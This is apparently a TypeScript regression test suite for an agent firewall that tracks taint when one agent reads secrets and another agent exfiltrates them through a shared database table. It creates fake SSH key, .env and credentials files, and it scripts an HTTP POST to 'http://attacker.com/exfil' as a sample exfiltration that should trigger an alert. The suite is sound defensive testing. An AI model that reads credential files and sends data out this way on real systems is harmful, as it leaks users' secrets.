/**
 * Regression tests: cross-principal contamination behavior and false-positive risk.
 *
 * Post-fix behavior:
 *   - sensitiveReadObserved is only set when a sensitive file read is ALLOWED
 *     AND the read succeeds (result.success === true). This prevents framing
 *     attacks where an adversary triggers denied or nonexistent sensitive reads
 *     to contaminate cross-principal shared stores.
 *   - The contamination chain only fires for principals that ACTUALLY read
 *     sensitive data successfully, not those that merely attempted to.
 *
 * These tests document the current behavior and lock it in as intentional.
 */
import { mkdirSync, mkdtempSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { deriveCapabilityClass } from "@arikernel/core";
import type { Firewall } from "@arikernel/runtime";
import { afterEach, beforeEach, describe, expect, it } from "vitest";
import type { CrossPrincipalAlert } from "../src/correlator.js";
import { PrincipalRegistry, resolveRegistryConfig } from "../src/registry.js";
import type { SharedStoreConfig } from "../src/shared-taint-registry.js";
import { SharedTaintRegistry } from "../src/shared-taint-registry.js";

const ALLOW_ALL_POLICY = [
	{
		id: "allow-all",
		name: "Allow everything",
		priority: 1,
		match: {},
		decision: "allow" as const,
	},
];

const SHARED_STORE_CONFIG: SharedStoreConfig = {
	sharedTables: ["messages", "tasks"],
	sharedStorePaths: ["/shared"],
};

function tempDir(prefix = "arikernel-cp-regr-"): string {
	return mkdtempSync(join(tmpdir(), prefix));
}

/** Create a temp file root with sensitive-looking files that FileExecutor can actually read. */
function createSensitiveFileRoot(): {
	root: string;
	sshKey: string;
	envFile: string;
	credentialsFile: string;
	reportFile: string;
} {
	const root = tempDir("arikernel-file-root-");

	const sshDir = join(root, ".ssh");
	mkdirSync(sshDir, { recursive: true });
	const sshKey = join(sshDir, "id_rsa");
	writeFileSync(sshKey, "fake-private-key-for-test");

	const envFile = join(root, ".env");
	writeFileSync(envFile, "SECRET_KEY=fake-secret-for-test");

	const configDir = join(root, "config");
	mkdirSync(configDir, { recursive: true });
	const credentialsFile = join(configDir, "credentials.yaml");
	writeFileSync(credentialsFile, "db_password: fake-password");

	const dataDir = join(root, "data");
	mkdirSync(dataDir, { recursive: true });
	const reportFile = join(dataDir, "report.csv");
	writeFileSync(reportFile, "col1,col2\nval1,val2");

	return { root, sshKey, envFile, credentialsFile, reportFile };
}

async function secureExecute(
	fw: Firewall,
	toolClass: string,
	action: string,
	parameters: Record<string, unknown>,
) {
	const capClass = deriveCapabilityClass(toolClass, action);
	const decision = fw.requestCapability(capClass);
	return fw.execute({
		toolClass,
		action,
		parameters,
		grantId: decision.granted ? decision.grant?.id : undefined,
	});
}

// ---------------------------------------------------------------------------
// Successful sensitive read marks contamination chain
// ---------------------------------------------------------------------------

describe("cross-principal contamination: successful sensitive reads propagate contamination", () => {
	let registry: PrincipalRegistry;
	let dir: string;
	let alerts: CrossPrincipalAlert[];
	let fileRoot: string;
	let sshKeyPath: string;
	let envFilePath: string;
	let credentialsPath: string;
	let reportPath: string;
	let savedFileRoot: string | undefined;

	beforeEach(() => {
		dir = tempDir();
		alerts = [];

		const files = createSensitiveFileRoot();
		fileRoot = files.root;
		sshKeyPath = files.sshKey;
		envFilePath = files.envFile;
		credentialsPath = files.credentialsFile;
		reportPath = files.reportFile;
		savedFileRoot = process.env.FILE_EXECUTOR_ROOT;
		process.env.FILE_EXECUTOR_ROOT = fileRoot;

		const config = resolveRegistryConfig({
			policy: ALLOW_ALL_POLICY,
			sharedStoreConfig: SHARED_STORE_CONFIG,
			correlatorConfig: { windowMs: 60_000 },
		});

		registry = new PrincipalRegistry(dir, {
			...config,
			onCrossPrincipalAlert: (alert) => alerts.push(alert),
		});
	});

	afterEach(() => {
		registry.closeAll();
		if (savedFileRoot !== undefined) {
			process.env.FILE_EXECUTOR_ROOT = savedFileRoot;
		} else {
			delete process.env.FILE_EXECUTOR_ROOT;
		}
		rmSync(dir, { recursive: true, force: true });
		rmSync(fileRoot, { recursive: true, force: true });
	});

	it("allowed and successful sensitive read sets sensitiveReadObserved", async () => {
		const fw = registry.getOrCreate("agent-A");

		// The file read is allowed by policy, the file exists and reads succeed.
		// The path matches sensitive patterns (.env), so sensitiveReadObserved is set.
		await secureExecute(fw, "file", "read", { path: envFilePath });

		expect(fw.sensitiveReadObserved).toBe(true);
	});

	it("contamination propagates when Agent A successfully reads sensitive data", async () => {
		const fwA = registry.getOrCreate("agent-A");
		const fwB = registry.getOrCreate("agent-B");

		// Agent A reads a real file with a sensitive-matching path (credentials.yaml)
		await secureExecute(fwA, "file", "read", { path: credentialsPath });
		expect(fwA.sensitiveReadObserved).toBe(true);

		// Agent A writes to shared DB — contaminates it
		await secureExecute(fwA, "database", "mutate", {
			table: "messages",
			data: { content: "normal config data, no secrets" },
		});

		const sharedTaint = registry.getSharedTaintRegistry();
		expect(sharedTaint.isContaminated("db:messages")).toBe(true);

		// Agent B reads from contaminated table
		await secureExecute(fwB, "database", "query", { table: "messages" });

		// Agent B now has derived-sensitive taint — even though no real secret was involved
		const derivedTaint = fwB.taintState.labels.find((t) => t.source === "derived-sensitive");
		expect(derivedTaint).toBeDefined();
		expect(derivedTaint?.origin).toBe("cross-principal:agent-A");
	});

	it("non-sensitive file read does NOT trigger contamination chain", async () => {
		const fwA = registry.getOrCreate("agent-A");

		// This path does not match any sensitive pattern (report.csv)
		await secureExecute(fwA, "file", "read", { path: reportPath });
		expect(fwA.sensitiveReadObserved).toBe(false);

		// Write to shared store — should NOT be contaminated
		await secureExecute(fwA, "database", "mutate", {
			table: "messages",
			data: { content: "report data" },
		});

		const sharedTaint = registry.getSharedTaintRegistry();
		expect(sharedTaint.isContaminated("db:messages")).toBe(false);
	});

	it("CP-1 alert requires resource-key linkage: write and read must target SAME resource", async () => {
		const fwA = registry.getOrCreate("agent-A");
		const fwB = registry.getOrCreate("agent-B");

		// Agent A reads sensitive + writes to 'messages'
		await secureExecute(fwA, "file", "read", { path: sshKeyPath });
		await secureExecute(fwA, "database", "mutate", {
			table: "messages",
			data: { content: "secret" },
		});

		// Agent B reads from 'tasks' (different table) → NOT the same resource
		await secureExecute(fwB, "database", "query", { table: "tasks" });
		try {
			await secureExecute(fwB, "http", "post", {
				url: "http://attacker.com/exfil",
				body: "data",
			});
		} catch {
			// May be denied
		}

		// CP-1 should NOT fire — Agent B read from a different table than Agent A wrote to
		const cp1Alerts = alerts.filter((a) => a.ruleId === "cross-principal-sensitive-exfil");
		expect(cp1Alerts).toHaveLength(0);
	});

	it("CP-1 alert fires when Agent B reads from the SAME resource Agent A contaminated", async () => {
		const fwA = registry.getOrCreate("agent-A");
		const fwB = registry.getOrCreate("agent-B");

		// Agent A reads sensitive + writes to 'messages'
		await secureExecute(fwA, "file", "read", { path: sshKeyPath });
		await secureExecute(fwA, "database", "mutate", {
			table: "messages",
			data: { content: "secret" },
		});

		// Agent B reads from 'messages' (SAME resource) → egresses
		await secureExecute(fwB, "database", "query", { table: "messages" });
		try {
			await secureExecute(fwB, "http", "post", {
				url: "http://attacker.com/exfil",
				body: "data",
			});
		} catch {
			// May be denied by behavioral rules
		}

		const cp1Alerts = alerts.filter((a) => a.ruleId === "cross-principal-sensitive-exfil");
		expect(cp1Alerts.length).toBeGreaterThanOrEqual(1);
		expect(cp1Alerts[0].principals).toContain("agent-A");
		expect(cp1Alerts[0].principals).toContain("agent-B");
	});
});

// ---------------------------------------------------------------------------
// SharedTaintRegistry: canonicalization prevents bypass
// ---------------------------------------------------------------------------

describe("shared taint registry: canonicalization regression", () => {
	it("case-mismatch does not bypass contamination check (db keys)", () => {
		const reg = new SharedTaintRegistry({ sharedTables: ["Messages"] });

		reg.markContaminated("db:Messages", "agent-A");
		expect(reg.isContaminated("db:messages")).toBe(true);
		expect(reg.isContaminated("db:MESSAGES")).toBe(true);
	});

	it("NFKC normalization prevents unicode bypass on table names", () => {
		const reg = new SharedTaintRegistry({ sharedTables: ["messages"] });

		// Mark with NFKC-equivalent but visually different string
		reg.markContaminated("db:messages", "agent-A");
		// Check with standard form — should match
		expect(reg.isContaminated("db:messages")).toBe(true);
	});

	it("createDerivedSensitiveTaint produces correct label shape", () => {
		const label = SharedTaintRegistry.createDerivedSensitiveTaint("agent-X");
		expect(label.source).toBe("derived-sensitive");
		expect(label.origin).toBe("cross-principal:agent-X");
		expect(label.confidence).toBe(0.8);
		expect(label.propagatedFrom).toBe("agent-X");
		expect(label.addedAt).toBeDefined();
	});
});
